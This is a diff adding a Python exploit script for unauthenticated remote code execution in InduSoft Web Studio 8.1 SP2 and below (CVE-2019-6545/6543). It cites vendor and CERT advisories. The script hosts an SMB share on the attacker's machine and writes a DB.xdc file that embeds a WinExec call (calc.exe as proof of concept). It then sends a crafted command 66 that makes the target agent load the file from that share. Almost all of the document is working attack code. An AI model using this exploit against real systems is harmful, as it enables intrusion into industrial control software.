@@ -1,0 +1,136 @@
+##
+# Exploit Title: Indusoft Web Studio Unauthenticated RCE
+# Date: 02/04/2019
+# Exploit Author: Jacob Baines
+# Vendor Homepage: http://www.indusoft.com/
+# Software http://www.indusoft.com/Products-Downloads/Download-Library
+# Version: 8.1 SP2 and below
+# Tested on: Windows 7 running the Web Studio 8.1 SP2 demo app
+# CVE : CVE-2019-6545 CVE-2019-6543
+# Advisory:
+https://sw.aveva.com/hubfs/assets-2018/pdf/security-bulletin/SecurityBulletin_LFSec133.pdf?hsLang=en
+# Advisory: https://ics-cert.us-cert.gov/advisories/ICSA-19-036-01
+# Advisory: https://www.tenable.com/security/research/tra-2019-04
+##
+import argparse
+import threading
+import socket
+from struct import *
+import time
+import sys
+
+from impacket import smbserver
+
+##
+# The SMB Server function. Runs on its own thread.
+# @param lip the listening IP address
+##
+def smb_server(lip):
+    server = smbserver.SimpleSMBServer(listenAddress=lip, listenPort=445)
+    server.addShare('LOLWAT', '.', '')
+    server.setSMBChallenge('')
+    server.setLogFile('/dev/null')
+    server.start()
+
+##
+# Converts a normal string to a utf 16 with a length field.
+# @param s the string to convert
+##
+def wstr(s):
+  slen = len(s)
+  s = s.encode('utf_16_le')
+
+  out = '\xff\xfe\xff'
+  if slen < 0xff:
+    out += pack('<B', slen) + s
+  elif slen < 0xffff:
+    out += '\xff' + pack('<H', slen) + s
+  else:
+    out += '\xff\xff\xff' + pack('<L', slen) + s
+
+  return out
+
+if __name__ == '__main__':
+
+    top_parser = argparse.ArgumentParser(description='test')
+    top_parser.add_argument('--cip', action="store", dest="cip",
+required=True, help="The IPv4 address to connect to")
+    top_parser.add_argument('--cport', action="store", dest="cport",
+type=int, help="The port to connect to", default="1234")
+    top_parser.add_argument('--lip', action="store", dest="lip",
+required=True, help="The address to connect back to")
+    args = top_parser.parse_args()
+
+    # Connect to the remote agent
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    print "[+] Attempting connection to " + args.cip + ":" + str(args.cport)
+    sock.settimeout(15)
+    sock.connect((args.cip, args.cport))
+    print "[+] Connected!"
+
+    # spin up the SMB server thread
+    print "[+] Spinning up the SMB Server"
+    smb_thread = threading.Thread(target=smb_server, args=(args.lip, ))
+    smb_thread.daemon = True;
+    smb_thread.start()
+
+    # drop the xdc file
+    print "[+] Creating the DB.xdc file"
+    xdc = open("./DB.xdc", "w+")
+    xdc.write(
+        "<?xml version=\"1.0\"?>\n"
+        "<Connection>\n"
+          "\t<ConnectionString>{WinExec(\"calc.exe\")}</ConnectionString>\n"
+          "\t<User></User>\n"
+          "\t<TimeOut>2</TimeOut>\n"
+          "\t<LongTimeOut>5</LongTimeOut>\n"
+          "\t<HostName>127.0.0.1</HostName>\n"
+          "\t<TCPPort>3997</TCPPort>"
+          "\t<Flags>0</Flags>\n"
+          "\t<RetryInterval>120</RetryInterval>\n"
+        "</Connection>\n")
+    xdc.close()
+
+    print "[+] Sending the connection init message"
+    init_conn = "\x02\x31\x10\x31\x10\x38\x10\x31\x10\x31\x03"
+    sock.sendall(init_conn)
+    resp = sock.recv(1024)
+    print '<- ' + resp
+
+    # do a basic validation of the response
+    if (len(resp) > 0 and resp[len(resp) - 1] == '\x03'):
+        print "[+] Received an init response"
+    else:
+        print "[-] Invalid init response. Exiting..."
+        sock.close()
+        sys.exit(0)
+
+    # Craft command 66
+    cmd = wstr('CO')  # options: EX, CO, CF, CC
+    cmd += wstr('\\\\' + args.lip + '\\LOLWAT\\DB') # file to load
+    cmd += wstr('')
+    cmd += wstr('')
+    cmd += wstr('')
+    cmd += wstr('lolwat')
+    cmd += pack('<L', 0x3e80)
+    cmd += pack('<L', 0)
+    cmd += pack('<L', 100)
+    cmd = '\x02\x42' + cmd + '\x03'
+
+    # Send it to the agent
+    print "[+] Sending command 66"
+    sock.sendall(cmd)
+
+    print "[+] Grabbing the command response"
+    resp = sock.recv(1024)
+    print '<- ' + resp
+    if resp.find("Format of the initialization string does not conform to
+specification starting at index 0".encode('utf_16_le')) != -1:
+        print '[+] Success! We received the expected error message.'
+    else:
+        print '[-] Unexpected error message. Something went wrong.'
+
+    print '[+] Disconnecting'
+    sock.close()
+    print '[+] Wait while the agent disconnects from the SMB server...'
+    sys.exit(0)
